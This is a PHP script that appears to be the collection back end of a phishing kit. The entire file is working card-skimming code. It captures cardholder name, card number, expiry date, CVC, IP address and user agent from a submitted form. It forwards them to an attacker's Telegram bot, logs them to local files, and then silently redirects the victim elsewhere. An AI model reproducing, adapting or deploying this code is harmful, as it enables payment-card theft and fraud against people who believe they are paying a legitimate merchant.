<?php

$creditcard_number = filter_input(INPUT_POST, 'creditcard_number', FILTER_SANITIZE_STRING);
$creditcard_name = filter_input(INPUT_POST, 'creditcard_name', FILTER_SANITIZE_STRING);
$exp_month = filter_input(INPUT_POST, 'month', FILTER_SANITIZE_NUMBER_INT);
$exp_year = filter_input(INPUT_POST, 'year', FILTER_SANITIZE_NUMBER_INT);
$cvc = filter_input(INPUT_POST, 'cvc', FILTER_SANITIZE_NUMBER_INT);
$user_agent = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT', FILTER_SANITIZE_STRING);
$ip = filter_input(INPUT_SERVER, 'HTTP_X_FORWARDED_FOR', FILTER_SANITIZE_STRING) ?? 'Unknown';
$expiration = sprintf("%02d/%d", $exp_month, $exp_year);

$root_dir = $_SERVER['DOCUMENT_ROOT'];

$settings_file = "$root_dir/details/settings.json";
$log_file = "$root_dir/details/log.log";
$result_file = $root_dir . "/details/result.log";
$result_file = str_replace("dist/details/", "", $result_file);

$send_to_bot = false;

function isValidUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

if (file_exists($settings_file)) {
    $json_data = file_get_contents($settings_file);
    $config = json_decode($json_data, true);

    if ($config && !empty($config['api_bot']) && !empty($config['id_user'])) {
        $send_to_bot = true;
        
        $message = sprintf(
            "[OS]: CARDESC PAY 🧾\n" .
            " • Card Name: %s\n" .
            " • Card Number: %s\n" .
            " • Date: %s\n" .
            " • CVV: %s\n\n" .
            "[Details] 🧊\n" .
            " • IP: %s\n" .
            " • User-Agent: %s",
            $creditcard_name, $creditcard_number, $expiration, $cvc, $ip, $user_agent
        );

        $api_url = "https://api.telegram.org/bot{$config['api_bot']}/sendMessage";
        $params = http_build_query([
            'chat_id' => $config['id_user'],
            'text' => $message
        ]);

        $context = stream_context_create([
            'http' => [
                'timeout' => 5,
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => $params
            ]
        ]);

        $response = @file_get_contents($api_url, false, $context);
        
        if ($response === false) {
            $send_to_bot = false;
        } else {
            $result = json_decode($response, true);
            if (isset($result['ok']) && $result['ok'] === true) {
                $send_to_bot = true;
            } else {
                $send_to_bot = false;
            }
        }
    }
}

$log_entry = sprintf(
    "x.add_row(['PAY', '%s', '%s', '%s', '%s', '%s', '%s'])\n",
    $creditcard_name, $creditcard_number, $expiration, $cvc, $ip, $send_to_bot ? 'true' : 'false'
);
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

$result_entry = sprintf(
    "[OS]: CARDESC PAY\n" .
    "[Card Name]: %s\n" .
    "[Card Number]: %s\n" .
    "[Date]: %s\n" .
    "[CVV2]: %s\n" .
    "[Send bot]: %s\n" .
    "[IP]: %s\n" .
    "[User-Agent]: %s\n\n",
    $creditcard_name, $creditcard_number, $expiration, $cvc, 
    $send_to_bot ? 'true' : 'false', $ip, $user_agent
);
file_put_contents($result_file, $result_entry, FILE_APPEND | LOCK_EX);

$redirect_url = file_exists('location.location') 
    ? trim(file_get_contents('location.location')) 
    : 'https://google.com';

if (!isValidUrl($redirect_url)) {
    $redirect_url = 'https://google.com';
}

?>

<script>
    window.location.href = <?php echo json_encode($redirect_url); ?>;
</script>